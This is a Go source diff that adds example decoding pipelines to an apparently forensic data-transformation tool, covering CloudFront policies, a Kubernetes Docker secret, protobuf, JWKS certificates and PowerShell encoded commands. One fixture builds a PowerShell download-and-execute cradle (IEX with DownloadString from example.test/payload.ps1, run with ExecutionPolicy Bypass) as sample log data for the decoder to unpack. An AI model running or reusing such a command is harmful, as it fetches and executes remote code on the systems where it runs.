@@ -133,6 +133,95 @@ func BuiltinExamples() []Example {
 			WantContains: "admin-auth-service-prod-edge-001x.example.com.",
 		},
 		{
+			Name:        "CloudFront signed URL policy",
+			Description: "Extract a CloudFront custom Policy parameter, normalize its CloudFront Base64 substitutions, decode the policy JSON, and summarize the grant.",
+			Source:      cloudFrontSignedURL(),
+			Steps: []PresetStep{
+				{Plugin: "regex", Options: map[string]string{
+					"re":    `(?s).*[\?&]Policy=([^&]+).*`,
+					"group": "1",
+				}},
+				{Plugin: "regex", Options: map[string]string{"re": `~`, "replace": `/`}},
+				{Plugin: "regex", Options: map[string]string{"re": `_`, "replace": `=`}},
+				{Plugin: "regex", Options: map[string]string{"re": `-`, "replace": `+`}},
+				{Plugin: "base64", Unprocess: true},
+				{Plugin: "json"},
+				{Plugin: "jq", Options: map[string]string{
+					"q":        `{resource: .Statement[0].Resource, expires: .Statement[0].Condition.DateLessThan["AWS:EpochTime"], source: .Statement[0].Condition.IpAddress["AWS:SourceIp"]}`,
+					"no-color": "true",
+				}},
+			},
+			WantContains: `"source": "192.0.2.0/24"`,
+		},
+		{
+			Name:        "Kubernetes docker config secret",
+			Description: "Extract a base64 Docker config from a Kubernetes Secret manifest, parse the nested JSON, then pull out the registry auth field.",
+			Source:      kubernetesDockerConfigSecret(),
+			Steps: []PresetStep{
+				{Plugin: "regex", Options: map[string]string{
+					"re":    `(?m)^\s+\.dockercfg:\s*\|\s*\n\s+([A-Za-z0-9+/=]+)`,
+					"group": "1",
+				}},
+				{Plugin: "base64", Unprocess: true},
+				{Plugin: "json"},
+				{Plugin: "jq", Options: map[string]string{
+					"q":        `.auths["https://example/v1/"].auth`,
+					"no-color": "true",
+				}},
+				{Plugin: "regex", Options: map[string]string{
+					"re":    `"([^"]+)"`,
+					"group": "1",
+				}},
+			},
+			WantContains: "opensesame",
+		},
+		{
+			Name:        "Nested protobuf wire message",
+			Description: "Hex-decode the protobuf documentation's nested message bytes and inspect the schema-less wire fields.",
+			Source:      []byte("1a03089601"),
+			Steps: []PresetStep{
+				{Plugin: "hex", Unprocess: true},
+				{Plugin: "protobuf"},
+			},
+			WantContains: "3: message",
+		},
+		{
+			Name:        "PowerShell EncodedCommand from process log",
+			Description: "Extract a PowerShell EncodedCommand from a process-creation event, Base64-decode the UTF-16LE command, then pull out the staged URL.",
+			Source:      powershellEncodedCommandEvent(),
+			Steps: []PresetStep{
+				{Plugin: "regex", Options: map[string]string{
+					"re":    `(?i)-e(?:ncodedcommand|nc|n|c)?\s+([A-Za-z0-9+/=]+)`,
+					"group": "1",
+				}},
+				{Plugin: "base64", Unprocess: true},
+				{Plugin: "utf16le", Unprocess: true},
+				{Plugin: "regex", Options: map[string]string{
+					"re": `https?://[^'"\s)]+`,
+				}},
+			},
+			WantContains: "https://example.test/payload.ps1",
+		},
+		{
+			Name:        "JWKS x5c signing certificate",
+			Description: "Extract the first x5c certificate from an OIDC/JWKS key set, decode the DER certificate, wrap it as PEM, and print certificate details.",
+			Source:      jwksWithX5C(),
+			Steps: []PresetStep{
+				{Plugin: "jq", Options: map[string]string{
+					"q":        `.keys[0].x5c[0]`,
+					"no-color": "true",
+				}},
+				{Plugin: "regex", Options: map[string]string{
+					"re":    `"([^"]+)"`,
+					"group": "1",
+				}},
+				{Plugin: "base64", Unprocess: true},
+				{Plugin: "pem", Options: map[string]string{"cert": "true"}},
+				{Plugin: "certPrinter"},
+			},
+			WantContains: "www.example.test",
+		},
+		{
 			Name:        "AES-GCM API secret",
 			Description: "Base64-decode an encrypted API secret, decrypt it with AES-GCM and authenticated data, then format the JSON.",
 			Source:      aesGCMBase64([]byte(`{"api_key":"sk_live_redacted","scope":["invoice:read"],"tenant":"acme-prod"}`), "000102030405060708090a0b0c0d0e0f", "000102030405060708090a0b", "request-id=req_123"),
@@ -286,6 +375,62 @@ func loginRequestProto() []byte {
 	out = appendProtoVarint(out, 4<<3|0)
 	out = appendProtoVarint(out, 1)
 	return out
+}
+
+func cloudFrontSignedURL() []byte {
+	policy := `{"Statement":[{"Resource":"https://d111111abcdef8.cloudfront.net/game_download.zip","Condition":{"DateLessThan":{"AWS:EpochTime":1675159200},"DateGreaterThan":{"AWS:EpochTime":1675072800},"IpAddress":{"AWS:SourceIp":"192.0.2.0/24"}}}]}`
+	encoded := base64.StdEncoding.EncodeToString([]byte(policy))
+	encoded = strings.ReplaceAll(encoded, "+", "-")
+	encoded = strings.ReplaceAll(encoded, "=", "_")
+	encoded = strings.ReplaceAll(encoded, "/", "~")
+	return []byte("https://d111111abcdef8.cloudfront.net/game_download.zip?Policy=" + encoded + "&Signature=EXAMPLE&Key-Pair-Id=K2JCJMDEHXQW5F&Hash-Algorithm=SHA256")
+}
+
+func kubernetesDockerConfigSecret() []byte {
+	return []byte(`apiVersion: v1
+kind: Secret
+metadata:
+  name: secret-dockercfg
+type: kubernetes.io/dockercfg
+data:
+  .dockercfg: |
+    eyJhdXRocyI6eyJodHRwczovL2V4YW1wbGUvdjEvIjp7ImF1dGgiOiJvcGVuc2VzYW1lIn19fQo=
+`)
+}
+
+func powershellEncodedCommandEvent() []byte {
+	command := "IEX (New-Object Net.WebClient).DownloadString('https://example.test/payload.ps1')"
+	return []byte(`<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+  <System>
+    <Provider Name="Microsoft-Windows-Security-Auditing" />
+    <EventID>4688</EventID>
+  </System>
+  <EventData>
+    <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+    <Data Name="CommandLine">powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ` + base64UTF16LE(command) + `</Data>
+    <Data Name="ParentProcessName">C:\Windows\explorer.exe</Data>
+  </EventData>
+</Event>`)
+}
+
+func jwksWithX5C() []byte {
+	block, _ := pem.Decode(sampleCertificatePEM())
+	if block == nil {
+		return nil
+	}
+	cert := base64.StdEncoding.EncodeToString(block.Bytes)
+	return []byte(`{"keys":[{"kty":"RSA","use":"sig","kid":"example-signing-key","alg":"RS256","x5c":["` + cert + `"]}]}`)
+}
+
+func base64UTF16LE(s string) string {
+	buf := make([]byte, 0, len(s)*2)
+	for _, r := range s {
+		if r > 0xffff {
+			r = '\ufffd'
+		}
+		buf = append(buf, byte(r), byte(r>>8))
+	}
+	return base64.StdEncoding.EncodeToString(buf)
 }
 
 func appendProtoString(out []byte, field uint64, value string) []byte {
